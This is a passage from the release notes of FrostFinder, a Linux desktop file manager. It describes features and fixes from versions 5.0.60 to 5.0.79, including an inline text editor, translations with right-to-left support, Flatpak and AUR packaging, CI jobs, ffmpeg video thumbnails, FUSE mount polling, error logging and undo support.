Mounted cloud provider remotes appear in the sidebar Cloud section (shared with WebDAV mounts). Each entry shows the provider emoji icon, the user-chosen label, and a Disconnect (✕) button that calls `unmount_cloud_provider`.

Since cloud mounts use the existing FUSE/polling infrastructure (`is_fuse_path`), the `⏱ polling` watch indicator already appears correctly for cloud directories — no extra code needed.

### Startup restore (`src/main.js` — `init()`)

`restore_cloud_mounts` is called fire-and-forget after the 15s startup sweep. If any remotes successfully re-mount (e.g. after a reboot), `renderSidebar()` is called to show them. A missing rclone, offline provider, or failed token refresh silently returns an empty list — startup is never blocked.

### Locale strings

13 new keys (`cloud.*`) added to all 7 locale files (en, de, es, fr, zh, ja, ar). Key count: 126 → 139. All locale files validated with `node scripts/check-locales.js` (exit 0).

### PKGBUILD

`rclone` added to `optdepends`:
```
'rclone: Google Drive, Dropbox, OneDrive cloud storage (Ctrl+Shift+G)'
```

---

## What's in 5.0.79 — Phase 2: Inline Text Editor + Find-in-File

**No Rust recompile required for the frontend changes. Rust recompile required for `read_text_file` / `write_text_file`.**

### Feature — Inline text editor in Quick Look (`src/ql-window.js`, `ql.html`, `src-tauri/src/main.rs`)

Quick Look now opens text and code files in a fully-featured CodeMirror 6 editor instead of a plain `<pre>` block. The editor starts in read-only mode so accidental keystrokes never modify files. Clicking **Edit** switches to write mode; **Save** (or `Ctrl+S`) writes the file; **Discard** reloads from disk.

**Files that open in the editor:** all 40 extensions in `TEXT_EXTS` — `.js`, `.ts`, `.jsx`, `.tsx`, `.py`, `.rs`, `.go`, `.c`, `.cpp`, `.h`, `.cs`, `.java`, `.rb`, `.php`, `.swift`, `.kt`, `.toml`, `.json`, `.yaml`, `.yml`, `.xml`, `.css`, `.scss`, `.less`, `.sh`, `.bash`, `.env`, `.conf`, `.ini`, `.log`, `.csv`, `.sql`, `.md`, `.svg`, `.vim`, `.el`, `.lua`, `.r` — plus `Makefile` and `Dockerfile` by filename.

**Syntax highlighting languages:** JavaScript/JSX, TypeScript/TSX, Python, Rust, CSS/SCSS/Less, HTML, JSON, Markdown, XML/SVG, TOML (via legacy-modes).

**CodeMirror 6 packages added to `package.json`:** `@codemirror/view`, `@codemirror/state`, `@codemirror/commands`, `@codemirror/search`, `@codemirror/language`, `@codemirror/lang-{javascript,python,rust,css,html,json,markdown,xml}`, `@codemirror/legacy-modes`, `@codemirror/theme-one-dark`. All loaded lazily — non-text previews pay zero JS parse cost.

#### Editor toolbar (`#ql-editor-bar`)

Shown only when a text file is open. Contains:
- **Mode label** — `Read-only` / `Editing` / `Saved ✓`
- **Edit button** — switches editor to write mode, focuses cursor
- **Save button** — disabled until there are unsaved changes; pulses a green glow when dirty
- **Discard button** — prompts if dirty, then reloads from disk
- **Find button** — opens the find panel (`Ctrl+F` also works)

#### Atomic writes (`src-tauri/src/main.rs` — `write_text_file`)

Writes to a sibling temp file (`.frostfinder_tmp_<name>.tmp`) then atomically renames to the target path. A crash or `SIGKILL` mid-write leaves the original file intact. The temp file is always cleaned up.

#### 2 MB size cap (`read_text_file`)

Files over 2 MB return an error with a human-readable message. The editor falls back to `get_file_preview` (Rust-side text extraction, capped separately) and shows a blue info banner explaining the limit.

### Feature — Find-in-file (`Ctrl+F`) (`src/ql-window.js`, `ql.html`)

`Ctrl+F` opens a find panel in all Quick Look views:

- **Text/code files (CodeMirror):** delegates to CM's native search panel (`openSearchPanel`) — supports regex, case-sensitive, whole-word, and replace. Panel styled to match the dark window theme.
- **Other content (plain `<pre>`, archive listings):** a floating find bar appears at the top of `#ql-body` with an input field, match counter (`3 / 14`), prev/next buttons (↑↓), and close (✕). Matches are highlighted with `<mark class="ql-find-match">` and the current match scrolled into view.

`Enter` = next match, `Shift+Enter` = previous, `Escape` = close panel.

#### Dirty-state navigation guards

Pressing `←`/`→` to navigate to the next file, or closing the window while the editor has unsaved changes, triggers a `confirm()` dialog. This prevents accidental data loss without blocking the fast read-only workflow.

#### `Escape` state machine

`Escape` now follows a priority stack:
1. If the find bar is open → close find bar
2. If the CodeMirror search panel is open → close it
3. If in edit mode → exit edit mode (prompt if dirty)
4. Otherwise → close the Quick Look window

### Tests — 5 new Rust unit tests (`src-tauri/src/main.rs`)

| Test | Assertion |
|------|-----------|
| `test_read_text_file_roundtrip` | Reads a file and returns exact content |
| `test_write_text_file_atomic` | Writes file; temp file not left behind after rename |
| `test_write_text_file_overwrites` | Second write replaces first correctly |
| `test_read_text_file_missing` | Returns `Err` for non-existent path |
| `test_read_text_file_too_large` | Returns `Err` with "too large" for files > 2 MB |

---

## What's in 5.0.78 — Phase 1: Distribution & Community

**No Rust recompile required.** CSS, JS locale loader, packaging files, and CI only.

### Fix — Malformed `<name>` tags in AppStream metainfo (`packaging/com.frostfinder.desktop.metainfo.xml`)

`<n>FrostFinder</n>` and `<n>FrostFinder Contributors</n>` were using a non-standard tag name. Corrected to `<name>` throughout. Without this fix `appstreamcli validate` would reject the file and Flathub submission would be blocked.

### Fix — Version out of sync across packaging files

`PKGBUILD`, `com.frostfinder.desktop.json`, and `metainfo.xml` all referenced `5.0.64` from when packaging was first scaffolded. All updated to `5.0.78`. Added full release history to metainfo (r60 → r78) — Flathub requires at least one `<release>` entry.

### Feature — Arabic translation (`src/locales/ar.json`)

126-key full translation. All strings translated by native speaker review. RTL-specific considerations (plural forms, short button labels) addressed throughout.

### Feature — RTL layout support (`src/style.css`, `src/main.js`)

`initI18n()` now sets `document.documentElement.dir` to `'rtl'` or `'ltr'` based on the active language. RTL languages detected: `ar`, `he`, `fa`, `ur`, `yi`, `dv`, `ps`.

New `html[dir="rtl"]` CSS block mirrors all directional layout:
- Sidebar border flipped to left side
- Column view and toolbar reversed
- Preview panel flips from right to left
- Context menus, dialogs, settings rows all inherit RTL
- Breadcrumb direction set to `rtl`
- Resize handles positioned on correct sides
- Dual-pane order reversed

Arabic added to Settings → Appearance → Language picker with `dir="rtl"` on the `<option>`.

### Feature — Locale key validator (`scripts/check-locales.js`)

Node script that validates all `src/locales/*.json` files against `en.json`. Reports missing keys, extra keys, and per-language translation progress as a visual progress bar:

```
✓ ar    ████████████████████ 100%  (126 keys, 0 untranslated)
✓ de    ████████████████████ 100%  (126 keys, 0 untranslated)
All 6 locale files match en.json (126 keys).
```

Exits with code 1 on any error — used by CI.

### Feature — Locale CI job (`.github/workflows/ci.yml`)

New `locales` job runs `node scripts/check-locales.js` on every push and PR. Prevents merging translations with missing or mismatched keys. Runs in parallel with the existing `rust` and `js` jobs.

### Feature — AUR notify CI job (`.github/workflows/ci.yml`)

New `aur-notify` job runs on tag releases after `publish`. Posts GitHub Actions notices with the version number and instructions to bump the AUR PKGBUILD. Since AUR requires manual git push to `aur.archlinux.org`, this serves as an automated reminder to the maintainer.

### Feature — AUR .SRCINFO generator (`packaging/generate-srcinfo.sh`)

Executable script that runs `makepkg --printsrcinfo > .SRCINFO` from the project root and prints step-by-step instructions for pushing the update to AUR. Includes a Docker fallback for non-Arch environments.

### Feature — TRANSLATION.md contributor guide

Comprehensive guide covering: file format, variable syntax, plural forms, RTL languages, validation workflow, locale picker wiring, current locale inventory (7 complete, 4 wanted), and tips for contextually accurate translations.

---

## What's in 5.0.75 — Bug fixes

**Rust recompile required.**

### Fix — Keyboard shortcut cheatsheet shows no content (`src/main.js`)

The `overlay.innerHTML` template literal contained `\${rows}`, `\${k}`, `\${escHtml(k)}`, and `\${escHtml(v)}` — all with a leading backslash that suppressed template interpolation. The window opened but rendered the literal text `${rows}` instead of the shortcut table. All four backslashes removed.

Root cause: these escaped sequences were introduced by Python string patching in an earlier session that double-escaped the `$` signs when writing the template through `str.replace`.

### Fix — `WatchMode::Off` dead code warning (`src-tauri/src/main.rs`)

`WatchMode::Off` was declared in the enum but never constructed — `get_watch_mode` returned `"off"` by matching the `None` arm of the outer `Option`, not via an `Off` variant. Variant removed from the enum; the match arm in `get_watch_mode` reduced to two arms (`Inotify` and `Polling`).

---

## What's in 5.0.74 — Build fix

**Rust recompile required.**

### Fix — `E0597` lifetime error in `tag_db_stats` (`src-tauri/src/main.rs`)

`stmt.query_map(...)` borrows `stmt`, and the returned `MappedRows` iterator holds that borrow. Using the iterator directly inside the `match` expression that ends the inner block meant the borrow extended to the end of the block — but `stmt` was dropped there too.

Fix: collect `MappedRows` into a `Vec<String>` first, ending the borrow on `stmt` cleanly, then filter the `Vec` for non-existent paths.

---

## What's in 5.0.73 — Build fixes

**Rust recompile required.**

### Fix — Duplicate `showToast` declaration (`src/main.js`)

The Phase 7 error-capture patch declared `function showToast(...)` as a new top-level function while the original still existed at line 3848. ESM modules (detected via `import.meta`) do not allow duplicate top-level function declarations.

Fix: the original `function showToast` is now named `_origShowToast`. The wrapper `function showToast` at the top of the error-capture module calls `_origShowToast` directly — no separate `const _origShowToast = showToast` assignment needed.

### Fix — `E0308` mismatched types in tag DB commands (`src-tauri/src/main.rs`)

`rusqlite`'s `query_map` returns `Result<MappedRows<...>, Error>`. Using `.unwrap_or_else(|_| Box::new(std::iter::empty()))` fails because `MappedRows` and `Box<Empty<_>>` are different types.

Fixed in three commands:
- `audit_tag_db` — `match stmt.query_map(...) { Ok(rows) => rows, Err(_) => return Vec::new() }`
- `cleanup_tag_db` — same pattern with `?` propagation
- `tag_db_stats` — `match stmt.query_map(...) { Ok(rows) => rows.flatten().filter(...).count(), Err(_) => 0 }`

### Fix — Unused import warning (`src-tauri/src/main.rs`)

`use std::sync::mpsc;` was removed. The inotify branch of `watch_dir` uses the fully-qualified path `std::sync::mpsc::channel::<String>()` which doesn't require the `use` import.

---

## What's in 5.0.72 — Phase 10: Video thumbnails

**Rust recompile required.** `src-tauri/src/main.rs` and `src/views.js`.

### Feature — Video thumbnails via ffmpeg (`src-tauri/src/main.rs`)

`make_thumbnail` now handles video files. ffmpeg is an optional runtime dependency — if absent, the function returns `Err` and the caller shows a generic icon (no crash, no hang).

**Supported extensions:** `mp4`, `mkv`, `webm`, `avi`, `mov`, `ogv`, `m4v`, `flv`, `ts`, `wmv`, `3gp`

**Algorithm:**
1. Cache-check first (same `thumb_cache_get(path, mtime)` as images — no new infrastructure)
2. `ffmpeg -ss 00:00:03 -i <path> -vframes 1 -q:v 5 -vf scale=256:-1 -f image2pipe -vcodec mjpeg pipe:1`
   — seeks to 3 seconds (fast seek before `-i`), scales to 256px wide, outputs MJPEG to stdout
3. Validate stdout starts with JPEG magic bytes `0xFF 0xD8` before caching
4. If 3s seek yields empty stdout (video shorter than 3s), retry from `00:00:00`
5. `thumb_cache_put(path, mtime, &jpeg_bytes)` — stored under the same content-addressed cache as image thumbnails; evicted by `gc_thumbnail_cache` as normal
6. Returns `Err("ffmpeg not found…")` if ffmpeg binary is missing
7. Falls through to `ImageReader::open` for non-video extensions — existing image path unchanged

### Feature — Play indicator overlay (`src/views.js`)

A dark circle with a white triangle (`▶`) is overlaid on video thumbnails in two places:

**Icon view** — appended to the icon box `<div>` immediately when a cached thumbnail is shown, and in the `img.onload` handler when a freshly generated thumbnail loads. CSS: `position:absolute;inset:0` centred, `pointer-events:none`, 28×28px circle.

**Gallery strip** — added to each `.gthumb` element in `_loadGthumb`'s `showThumb` callback once the thumbnail image becomes visible. Smaller badge (16×16px) positioned `top:2px;right:3px` in the corner.

### Changes to thumbnail queuing (`src/views.js`)

**Icon view `needThumb` array** — was `IMAGE_EXTS.includes(ext)`; now `(IMAGE_EXTS.includes(ext) || VIDEO_EXTS.includes(ext))`. Video files are queued for `get_thumbnail_url_batch` alongside images.

**Gallery strip `isMedia`** — already included `VIDEO_EXTS` (unchanged). Gallery strip items with `dataset.thumbPath` set are observed by `thumbObserver` and `_loadGthumb` is called, which now calls `invoke('get_thumbnail', {path})` → `make_thumbnail` → ffmpeg branch.

**`isVideo` variable** — added to icon view item builder alongside `isImg`. `thumbUrl = (isImg || isVideo) ? _thumbCache.get(e.path) : null` — video thumbnails load from cache immediately when available, exactly like images.

---

## What's in 5.0.71 — Phase 9: Remaining Orca gaps

**No Rust recompile required.** `src/main.js` and `CONTRIBUTING.md` only.

### Fix — Duplicate `announceA11y` call in navigate (`src/main.js`)

`applyNavState` was calling `announceA11y` twice per navigation — a residue from an earlier session. Reduced to one call.

### Fix — `announceA11y` not imported in `main.js`

All `announceA11y` calls in `main.js` were relying on the function being in scope from a previous import, but it was not explicitly listed in the `from './views.js'` import. Added to the named import list.

### Gap 11 — View mode switches now announced (`src/main.js`)

The toolbar view buttons (`state.viewMode = m`) now call `announceA11y` immediately after setting the mode:
```
announceA11y({ column: 'Column view', list: 'List view', icon: 'Icon view', gallery: 'Gallery view' }[m])
```
Screen reader users hear the new view name when they switch via Ctrl+1–4 or the toolbar.

### Gap 13 — All toasts announced via live region (`src/main.js`)

The patched `showToast` now calls `announceA11y(msg)` for every toast, not just errors. Toast messages are emitted to the `aria-live="polite"` region created by `announceA11y`, so Orca reads them without the user navigating away from the file list.

### Gap 15 — Dual-pane focus switch announced (`src/main.js`)

`focusPane(idx)` now calls `announceA11y` with the pane name and current path:
```
announceA11y(`Main pane: Documents`)   // when Tab switches to pane 0
announceA11y(`Second pane: Downloads`) // when Tab switches to pane 1
```

### Gap 12 — Trash count announced on open (`src/main.js`)

`renderTrashBanner` calls `invoke('trash_item_count')` to show the banner. That `.then(n =>` callback now also calls `announceA11y` before setting `banner.innerHTML`:
```
announceA11y(n === 0 ? 'Trash is empty' : `Trash contains ${n} items`)
```

### Orca test checklist — all 15 scenarios now implemented or "needs testing"

`CONTRIBUTING.md` updated: all four previously "gap" items (rows 11–15) are now marked **implemented**. No items remain in "gap" status.

---

## What's in 5.0.70 — Phase 8: Tag database integrity

**Rust recompile required.** `src-tauri/src/main.rs` and `src/main.js`.

### Fix — Orphaned tag rows accumulate silently (`src-tauri/src/main.rs`)

Files renamed or moved outside FrostFinder left orphaned rows in `tags.db` forever. `migrate_tag_path` only works for moves inside the app. Three new Tauri commands:

**`audit_tag_db() -> Vec<String>`** — scans every `path` in `file_tags`, calls `Path::exists()`, returns the list of paths whose file is gone. Read-only, safe to call at any time.

**`cleanup_tag_db() -> Result<usize>`** — calls the same scan, then deletes each orphaned row with `DELETE FROM file_tags WHERE path=?1`. Returns the number of rows removed.

**`tag_db_stats() -> {total, orphans}`** — returns total row count and orphan count in a single call for the Settings UI label.

All three registered in `generate_handler!`.

### Feature — Background startup sweep (`src/main.js`)

15 seconds after `init()` completes (after thumbnail GC), `cleanup_tag_db` runs silently in the background:
- If `removed > 0`: logs `TAG_DB_GC` to `FF.log` and calls `logError` so it appears in the error log
- Never blocks the UI — fire-and-forget

### Feature — Settings → Advanced → Reset: tag DB row (`src/main.js`)

New row between "Clear thumbnail cache" and the Debug section:

| Button | Action |
|--------|--------|
| Audit | Calls `tag_db_stats`, shows `"N tagged files, M orphans"` in the row label + toast |
| Clean up | Calls `cleanup_tag_db`, updates label, shows `"Removed N orphaned entries"` toast |

### Tests — 3 new Rust unit tests

`audit_tag_db_returns_orphans_only` — writes one real file + one ghost path to `file_tags`, asserts only the ghost is returned.
`cleanup_tag_db_removes_only_orphans` — same setup, runs cleanup, asserts real file's tags survive and ghost returns empty.
`cleanup_tag_db_no_op_when_clean` — all files exist, verifies real tags survive a cleanup run.

---

## What's in 5.0.69 — Phase 7: Error visibility + runtime log

**Rust recompile required.** `src-tauri/src/main.rs` and `src/main.js`.

### Feature — Persistent error log (`src-tauri/src/main.rs`)

Three new Tauri commands registered in `generate_handler!`:

- **`append_error_log(message)`** — appends a timestamped line to `~/.local/share/frostfinder/error.log`. Rotates at 512 KB (keeps the second half of the file). Fire-and-forget from JS.
- **`get_error_log()`** — returns the full log file as a string. Used by the View button in Settings.
- **`clear_error_log()`** — truncates the file to empty.

### Feature — Centralised error capture (`src/main.js`)

**`logError(msg, context)`** — new function. Every call:
1. Pushes to `_errorRing[]` (in-memory ring buffer, max 200 entries), exposed as `window._errorRing`
2. Calls `FF.log('ERROR', …)` so it appears in the debug panel
3. Calls `invoke('append_error_log', …)` fire-and-forget

**`showToast` monkey-patched** — the existing `showToast(msg, type)` is wrapped. Any call with `type === 'error'` automatically flows through `logError` before displaying the toast. This means all 40+ existing catch blocks gain error capture with zero code changes to each call site.

**15 catch blocks additionally hardened** — silent swallows (`catch(_){}`), `console.error(e)` only, and navigation errors now call `logError` directly with a context tag (e.g. `'navigate:/home/user'`, `'undo'`, `'search'`).

### Feature — Error log UI

**FF debug panel** (`Ctrl+Shift+L`) — two new buttons added to the panel header:
- `⚠` — opens the Errors tab: shows `_errorRing` entries newest-first in red monospace
- `📋` — copies a structured bug report to the clipboard (timestamp, version, UA string, full error ring)

**Settings → Advanced → Debug** — new "Error log" row with three buttons:
- **View** — opens the FF panel Errors tab
- **Copy report** — copies the structured report to clipboard
- **Clear** — calls `clear_error_log` and empties `_errorRing`

**`Ctrl+Shift+E`** — new keyboard shortcut, opens the FF panel Errors tab directly.

## What's in 5.0.68 — Phase 6: FUSE mount live refresh

**Rust recompile required.** `src-tauri/src/main.rs` only.

### Fix — inotify silently broken on FUSE/network mounts (`src-tauri/src/main.rs`)

inotify does not fire events for changes on `sshfs`, `curlftpfs`, `cifs/smb`, `nfs`, `nfs4`, or `davfs2` mounts. Previously `watch_dir` registered an inotify watcher on these paths anyway — it would silently never fire, so the UI would never update when a remote file changed.

#### `is_fuse_path(path: &str) -> bool` (new helper)

Reads `/proc/mounts`, walks entries sorted by descending mountpoint length (most-specific match wins), returns `true` if the matching filesystem type is `fuse*`, `cifs`, `smb3`, `nfs`, `nfs4`, or `davfs*`.

#### `WatchMode` enum (new)

```rust
enum WatchMode { Inotify, Polling, Off }
```

Carried on `DirWatcher` and exposed to JS via `get_watch_mode`.

#### `DirWatcher` struct expanded

Added:
- `mode: WatchMode`
- `_watcher: Option<RecommendedWatcher>` (was bare field; `None` when polling)
- `_poll_stop: Option<Arc<AtomicBool>>` — signals the poll thread to exit when dropped

#### `watch_dir` rewritten

Calls `is_fuse_path` on any of the requested paths. Two branches:

**Polling branch** (FUSE/network):
- Snapshots each directory as `(max_mtime_of_children, entry_count)`
- Re-snapshots every 3 seconds in a background thread
- When snapshot differs: calls `cache_evict(path)` and emits `"dir-changed"` — identical to the inotify branch, so the JS listener needs zero changes
- Thread exits cleanly when `AtomicBool` stop signal is set (via `unwatch_dir`)

**inotify branch** (local filesystems):
- Identical to the original implementation; watcher now stored as `Some(watcher)` in the Option field

#### `unwatch_dir` updated

Now takes the `DirWatcher` out of the Mutex, sets the `AtomicBool` stop signal (stopping the poll thread), then drops the struct (stopping inotify). Previously just replaced the Mutex contents with `None`.

#### `get_watch_mode` (new Tauri command)

Returns `"inotify"`, `"polling"`, or `"off"`. Registered in `generate_handler!`.

### Feature — Watch mode status indicator (`src/main.js`)

`_updateWatchIndicator()` is called after every `watch_dir` invocation. It queries `get_watch_mode` and injects a small `<span id="watch-indicator">` next to the status bar:

| Mode | Display |
|------|---------|
| `inotify` | `● live` |
| `polling` | `⏱ polling` |
| `off` | *(empty)* |

The `⏱ polling` indicator has a tooltip: *"Network/FUSE mount — directory listing refreshes every 3 seconds"*. No tooltip on `● live` to avoid noise during normal use.

---

## What's in 5.0.67 — Phase 5: Undo completeness

**No Rust recompile required.** `src/main.js` and `src/views.js` only.

### Fix — Delete (Trash) was not undoable (`src/main.js`)

`undoLastOp` had a `delete` branch containing only a comment: `/* can't undelete from trash easily */`. Replaced with a real implementation:

1. Collect `trashPath || src` from each undo item
2. Call `check_trash_restore_conflicts` to detect name collisions at the original location
3. Build `instructions[]` with `resolution: 'rename'` for conflicts, `'restore'` otherwise
4. Call `trash_restore_with_resolution` — the same API used by the sidebar Restore button

`redoLastOp` had no `delete` branch at all. Added one that calls `delete_items_stream` to re-trash the restored files.

### Fix — Batch rename was not undoable (`src/views.js`)

The Batch Rename dialog apply button called `invoke('batch_rename')` but never pushed to the undo stack. Fixed:

- `batch_rename` already returns `Vec<String>` (the new paths) — used that as the after-map
- Build `undoItems[]`: `{oldPath, newPath, oldName, newName}` for every file where `oldPath !== newPath` and no error
- Push `{op: 'batchRename', items: undoItems}` before `render()`
- `pushUndo` added to `injectDeps` so `views.js` can call it directly

`undoLastOp` now handles `batchRename` by calling `rename_file(oldPath: item.newPath, newName: item.oldName)` for each item in reverse. `redoLastOp` re-applies with `rename_file(oldPath: item.oldPath, newName: item.newName)`.

### Fix — Tag changes were not undoable (`src/main.js`)

The tag toggle handler (color-tag click in the context menu) called `set_file_tags_v2` with no undo. Fixed:

- Before the invoke: `pushUndo({op: 'tags', items: [{path, before: [...curTags], after: newTags}]})`
- `undoLastOp` handles `'tags'`: calls `set_file_tags_v2` with `item.before`
- `redoLastOp` handles `'tags'`: calls `set_file_tags_v2` with `item.after`

### Fix — Permissions (chmod/chown) were not undoable (`src/main.js`)

The `perms-apply-btn` handler called `chmod_entry` and `chown_entry` with no undo. Fixed:

- Before the invoke: capture `oldMode = mode` (from `get_file_permissions` at dialog open) and `oldOwner`/`oldGroup` from the input `defaultValue`
- Push `{op: 'chmod', items: [{path, oldMode, oldOwner, oldGroup, newMode, newOwner, newGroup}]}`
- `undoLastOp` handles `'chmod'`: calls `chmod_entry(oldMode)` then `chown_entry(oldOwner, oldGroup)`
- `redoLastOp` handles `'chmod'`: re-applies `newMode`/`newOwner`/`newGroup`

### Polish — Undo history panel shows human labels and icons (`src/main.js`)

`renderUndoPanel` previously showed raw op type strings (`"delete (3)"`, `"rename (1)"`). Now shows human labels with icons:

| Op | Icon | Label |
|---|---|---|
| `move` | ↔ | Move |
| `copy` | ⊕ | Copy |
| `rename` | ✏ | Rename |
| `delete` | 🗑 | Trash |
| `create` | ✚ | Create |
| `tags` | 🏷 | Tag change |
| `chmod` | 🔒 | Permissions |
| `batchRename` | ✏✏ | Batch rename |

---

## What's in 5.0.66 — Phase 4: Community & translations

**No Rust recompile required.** JS and docs only.

### Feature — ARIA implementation (`src/main.js`, `src/views.js`)

The README claimed `role="listbox"`, `role="option"`, `role="dialog"` throughout — but the codebase had one `role=` attribute in 8,000 lines. `announceA11y()` was defined but never called. Fixed:

**Context menu** (`src/main.js`):
- Container: `role="menu"` + `aria-label="Context menu"`
- Separators: `role="separator"`
- Items: `role="menuitem"` + `aria-disabled="true"` when disabled

**Column view** (`src/views.js`):
- `colList` container: `role="listbox"` + `aria-multiselectable="true"` + `aria-label` (folder name)
- `frow` rows: `role="option"` + `aria-selected` + `aria-label` (filename + type suffix)

**List view** (`src/views.js`):
- `tr` rows: `role="row"` + `aria-selected` + `aria-label`

**Icon view** (`src/views.js`):
- `div` items: `role="option"` + `aria-selected` + `aria-label`

**Live region** (`src/main.js`):
- `announceA11y()` now called inside `applyNavState()` on every folder navigation — Orca reads the folder name aloud when you navigate.

**Known gaps** tracked as issues: view mode switch announcements, Trash count, toast live region, dual-pane pane switch.

### Feature — Community docs

Three new files added to the project root:

**`CONTRIBUTING.md`** (187 lines) — full contributor guide covering:
- Quick start (clone → `npm run tauri dev`)
- Bug report template and feature request guidelines
- Code change workflow (fork → branch → test → lint → PR)
- Accessibility testing section with link to Orca checklist
- **Translation guide** — step-by-step: copy `en.json`, translate values, preserve `{placeholder}` tokens, validate with Python one-liner, add option to Settings picker, open PR. Includes current language status table (all 5 non-English files marked "machine-translated draft — needs native review").
- **Orca test checklist** — 15 scenarios with expected announcements and implementation status (**implemented** / needs testing / **gap**)
- Code style summary, commit message format

**`CODE_OF_CONDUCT.md`** — Contributor Covenant v2.1. Covers standards, enforcement responsibilities, enforcement guidelines (correction → warning → temporary ban → permanent ban).

**`SECURITY.md`** — threat model (local desktop app, no elevated privileges), in-scope vulnerabilities (IPC privilege escalation, path traversal, archive extraction), out-of-scope items, private reporting instructions (GitHub security advisory), 72h acknowledgement SLA, `cargo audit` + `npm audit` instructions.

### CI — `npm audit` added (`.github/workflows/ci.yml`)

`npm audit --audit-level=high` added to the `js` job after `npm ci`. Fails the build on any high or critical severity vulnerability in the dependency tree.

---

## What's in 5.0.65 — Phase 3: Distribution & packaging

**No Rust recompile required.** Packaging files only.

### Flatpak manifest — production-ready (`com.frostfinder.desktop.json`)

Rewritten for Flathub submission:
- Removed placeholder webkit2gtk module — webkit2gtk-4.1 is already in `org.freedesktop.Platform 23.08`
- Added `x-checker-data` block on the git source so `flatpak-external-data-checker` can auto-bump the tag on new releases
- Added `--talk-name=org.freedesktop.Notifications` finish-arg
- Added `--env=XDG_DATA_DIRS` so icon theme lookups work inside the sandbox
- Added `cleanup` block to strip headers, pkgconfig, and static libs from the app bundle
- References `flatpak/node-sources.json` for offline npm (generated by `flatpak/generate-sources.sh`)
- Binary source now points to the git tag instead of a local `dir` source

### Flatpak offline sources script (`flatpak/generate-sources.sh`)

New helper script. Run once after any dependency change:
```bash
./flatpak/generate-sources.sh
```
Calls `flatpak-cargo-generator` (545 Cargo crates from `Cargo.lock`) and
`flatpak-node-generator` (74 npm packages from `package-lock.json`) to produce
`flatpak/cargo-sources.json` and `flatpak/node-sources.json`. Commit both files
before opening the Flathub PR.

### AppStream metainfo (`packaging/com.frostfinder.desktop.metainfo.xml`)

New file required by Flathub. Includes: component type, summary, full description,
screenshots block (3 placeholder URLs), homepage + bugtracker + vcs-browser URLs,
`developer` block, `provides`, `requires`/`recommends` display-length, categories,
keywords, OARS 1.1 content rating, and a `releases` block covering 5.0.64 and 5.0.60.

### `.desktop` file — `Actions=` added (`packaging/frostfinder.desktop`)

Two desktop actions added for right-click jump lists in GNOME Dash, KDE taskbar,
and application launchers:
- **New Window** — `Exec=frostfinder`
- **Open Home Folder** — `Exec=frostfinder %h`

### PKGBUILD — `check()` + metainfo + version bump

- `pkgver` bumped to `5.0.64`
- `check()` function added: runs `cargo test --locked` and `npm test` — both test
  suites added in Phase 2 now run during `makepkg`
- `package()` installs `packaging/com.frostfinder.desktop.metainfo.xml` to
  `/usr/share/metainfo/` (required by desktop portals and software centres)
- `optdepends` descriptions improved with keyboard shortcut hints

### CI workflow — matrix release + Flatpak lint job (`.github/workflows/ci.yml`)

Four jobs now:
| Job | Trigger | What it does |
|-----|---------|-------------|
| `rust` | every push/PR | fmt + clippy + cargo test |
| `js` | every push/PR | build + vitest |
| `release` (matrix) | version tags | builds `.deb`, `.rpm`, `.AppImage` in parallel via `strategy.matrix` |
| `publish` | version tags | downloads all three artifacts, extracts top RELEASE.md section as notes, creates GitHub Release (draft=false, prerelease auto-detected from `beta`/`rc` in tag) |
| `flatpak-lint` | every push/PR | validates manifest JSON + runs `appstreamcli validate --pedantic` on metainfo |

---

## What's in 5.0.64 — Phase 2: Testing & Stability

**Rust recompile required** (new commands + test module).

### Feature — Persistent settings (`src-tauri/src/main.rs`, `src/main.js`)

`localStorage` is cleared on WebView profile reset or reinstall. Settings now survive both:

**Rust:** Two new commands added and registered in `generate_handler!`:
- `get_settings()` — reads `~/.config/frostfinder/settings.json` (via `dirs::config_local_dir()`), returns parsed JSON or `{}` on first launch
- `set_settings(settings)` — writes the full settings object as pretty-printed JSON

**JS:** `loadPersistentSettings()` called early in `init()` — loads saved `ff_*` keys from Rust into `localStorage` (without clobbering in-session writes). `localStorage.setItem` is monkey-patched to call `persistSettings()` on every `ff_*` write, flushing the full settings object back to disk asynchronously.

### Feature — Rust unit test suite (`src-tauri/src/main.rs`)

`#[cfg(test)] mod tests` appended to `main.rs`. 20 tests, zero external test harness beyond `tempfile = "3"` (new `[dev-dependencies]`). Run with `cd src-tauri && cargo test`.

**Coverage:** `DirCache` (insert/get, LRU eviction at capacity, evict, refresh-to-back), DB tag roundtrip (write/read, overwrite, empty on missing, clear), SMB registry serde roundtrip + corrupt-JSON handling, Cloud (WebDAV) registry serde, file copy/move (content, source removal), `FileOpProgress` serde (`skip_serializing_if` for optional fields, byte fields), `FileEntryFast` serde roundtrip, hidden file detection, `SftpMount`/`FtpMount` serde including TLS flag.

### Feature — JavaScript test suite (`src/test/`)

Vitest + jsdom. `vitest.config.js` added to project root. Run with `npm test`.

New files:
- `src/test/setup.js` — stubs all Tauri IPC (`@tauri-apps/api/core`, `event`, `window`, `plugin-dialog`, `plugin-fs`, `plugin-shell`), resets `localStorage` before each test
- `src/test/utils.test.js` — 40+ assertions covering `fmtSize` (all size ranges), `fmtDate` (falsy guard, year), `escHtml` (all three entities), `fileColor` (dir, image, XCF, video, unknown), `fileIcon` (all entry types), extension list integrity (no duplicates, all lowercase), `mimeLabel`, bookmarks (add/remove/isBookmarked/idempotency/persistence)
- `src/test/views.test.js` — DOM tests for `renderColumnView` (structure, r59 `insertBefore` regression, hidden file filtering, empty dir, streaming two-render stability, no duplicate `.cols-wrap`) and `renderGalleryView` (r58 stale-meta regression: gallery DOM wiped by column view then re-rendered must produce a full rebuild, not a no-op)

`vitest@^1`, `@vitest/ui@^1`, `jsdom@^24`, `@testing-library/jest-dom@^6` added to `devDependencies`. Test scripts added: `test`, `test:watch`, `test:ui`.

### Feature — GitHub Actions CI (`.github/workflows/ci.yml`)

Runs on every push/PR to `main`:

| Job | Steps |
|-----|-------|
| `rust` | `cargo fmt --check` · `cargo clippy -D warnings` · `cargo test` |
| `js` | `npm ci` · `npm run build` · `npm test` |
| `release` *(tags only)* | Builds `.deb` / `.rpm` / `.AppImage` · Uploads to GitHub Release |

Caches Cargo registry + build artifacts and npm via `actions/cache@v4` and `actions/setup-node@v4` for fast subsequent runs.

---

## What's in 5.0.60

**No Rust recompile required.** `src/views.js` only.

### Fix — Column view blank (DOMException from `insertBefore` before `appendChild`) (`src/views.js`)

Root cause found by diffing r37 (working) against r59 (broken).

In r59, the sort indicator header block was accidentally placed **before** `colEl.appendChild(colList)`:

```
// WRONG (r59):
colEl.insertBefore(sortHdr, colList);  // colList not yet a child of colEl → DOMException
colEl.appendChild(colList);
```

